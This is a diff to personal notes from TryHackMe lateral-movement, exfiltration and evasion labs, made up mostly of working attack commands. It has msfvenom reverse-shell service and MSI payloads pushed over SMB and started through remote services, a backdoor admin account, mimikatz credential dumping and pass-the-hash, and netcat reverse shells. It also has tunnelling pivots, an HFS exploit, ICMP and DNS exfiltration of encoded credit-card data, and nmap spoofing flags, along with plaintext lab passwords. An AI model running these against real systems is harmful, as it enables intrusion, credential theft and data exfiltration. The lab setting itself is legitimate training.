@@ -518,10 +518,179 @@ $password = 'Mypass123';
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
 ```
+
+Navigate from attacker box
+http://distributor.za.tryhackme.com/creds
 ```
-msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
-smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
-msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444; run"
+ssh za.tryhackme.com\damien.horton@thmjmp2.za.tryhackme.com
+```
+
+Seting up the network
+```
+THMDCIP=10.200.19.101
+systemd-resolve --interface lateralmovement --set-dns $THMDCIP --set-domain za.tryhackme.com
+nslookup thmdc.za.tryhackme.com
+```
+
+```
+sudo openvpn tryhackme/resources/tornord.ovpn 
+```
+
+Check the ip of the attack box:
+```
+ip add show lateralmovement
+```
+
+```
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.17.19 LPORT=4253 -o myservice253.exe
+smbclient -c 'put myservice253.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4253; run"
 ```
 runas /netonly /user:za\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.10.208.253 4443"
-sc.exe \\thmiis.za.tryhackme.com create THMservice-253 binPath= "c:\myservice253.exe" start= auto
+
+move \\thmiis.za.tryhackme.com\admin$\myservice253.exe c:\
+sc.exe \\thmiis.za.tryhackme.com create thmservice-253 binPath= "%windir%\myservice253.exe" start= auto
+sc.exe \\thmiis.za.tryhackme.com start thmservice-253
+sc.exe \\thmiis.za.tryhackme.com query thmservice-253
+
+sc.exe \\thmiis.za.tryhackme.com config thmservice-253 binPath= "%windir%\myservice253.exe" start= auto
+
+sc.exe \\thmiis.za.tryhackme.com create fake-253 binPath= "net user adm253 Password123! /add" start= auto
+sc.exe \\thmiis.za.tryhackme.com start fake-253
+sc.exe \\thmiis.za.tryhackme.com stop fake-253
+sc.exe \\thmiis.za.tryhackme.com delete fake-253
+
+sc.exe create fake-253 binPath= "net user adm253 Password123! /add" start= auto
+
+ssh za\\t1_leonard.summers@thmjmp2.za.tryhackme.com
+ssh za\\arthur.campbell@thmjmp2.za.tryhackme.com
+
+## MSI installation
+
+On the attacker machine
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4254 -f msi -o myinst254.msi
+smbclient -c 'put myinst254.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4254; run"
+```
+
+Powershell on thmjmp2
+```
+$username = 't1_corine.waters';
+$password = 'Korine.1994';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-CimSession -ComputerName 'thmiis.za.tryhackme.com' -Credential $credential -SessionOption $Opt -ErrorAction Stop
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinst254.msi"; Options = ""; AllUsers = $false}
+```
+
+## Create local account and add to administrators
+
+```
+net user adm253 Password253 /add & net localgroup administrators adm253 /add
+```
+
+## Mimikatz
+
+```
+ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
+ssh za\\t2_abigail.cox@thmjmp2.za.tryhackme.com # Vivian2008
+```
+
+### Pass-the-Key
+
+We can obtain the Kerberos encryption keys from memory by using mimikatz
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+### Pass-the-Ticket 
+
+Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets
+```
+
+### Pass-the-Hash
+
+Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz
+```
+mimikatz # privilege::debug
+mimikatz # token::elevate
+```
+
+```
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+
+Use a hash:
+```
+token::revert
+sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.17.19 4254"
+```
+
+When connection's established:
+```
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+```
+
+In C:\tools
+```
+psexec64.exe \\thmjmp2.za.tryhackme.com -u Administrator -p Mypass123 -i cmd.exe
+```
+
+xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_abigail.cox /p:Vivian2008
+socat TCP4-LISTEN:13254,fork TCP4:THMIIS.za.tryhackme.com:3389
+xfreerdp /v:THMJMP2.za.tryhackme.com:13254 /u:t1_thomas.moore /p:MyPazzw3rd2020
+
+ssh tunneluser@10.50.17.19 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7254:127.0.0.1:7254 -N
+
+```
+msfconsole -q -x "use windows/http/rejetto_hfs_exec; set payload windows/shell_reverse_tcp; set lhost thmjmp2.za.tryhackme.com; set ReverseListenerBindAddress 127.0.0.1; set lport 7254; set srvhost 127.0.0.1; set srvport 6666; set rhosts 127.0.0.1; set rport 8888; run"
+```
+
+sudo nping --icmp -c 1 10.10.139.73 --data-string "BOFfile.txt"
+sudo nping --icmp -c 1 10.10.139.73 --data-string "admin:password"
+sudo nping --icmp -c 1 10.10.139.73 --data-string "admin2:password2"
+sudo nping --icmp -c 1 10.10.139.73 --data-string "EOF"
+
+cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
+TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com
+
+## Nmap
+
+UDP scan
+```
+nmap -sU -F 10.10.160.218
+```
+Hide a scan with decoys	-D DECOY1_IP1,DECOY_IP2,ME
+Hide a scan with random decoys	-D RND,RND,ME
+Use an HTTP/SOCKS4 proxy to relay connections	--proxies PROXY_URL
+Spoof source MAC address	--spoof-mac MAC_ADDRESS
+Spoof source IP address	-S IP_ADDRESS
+Use a specific source port number	-g PORT_NUM or --source-port PORT_NUM
+Fragment IP data into 8 bytes	-f
+Fragment IP data into 16 bytes	-ff
+Fragment packets with given MTU	--mtu VALUE
+Specify packet length	--data-length NUM
+Set IP time-to-live field	--ttl VALUE
+Send packets with specified IP options	--ip-options OPTIONS
+Send packets with a wrong TCP/UDP checksum	--badsum
+
+## Ncat
+
+Listen on a port
+```
+ncat -lvnp 4444
+```
+
+-l tells ncat to listen for incoming connections
+-v gets more verbose output as ncat binds to a source port and receives a connection
+-n avoids resolving hostnames
+-p specifies the port number that ncat will listen on
+
+ncat -lvnp 443 -c "ncat 127.0.0.1 8008"
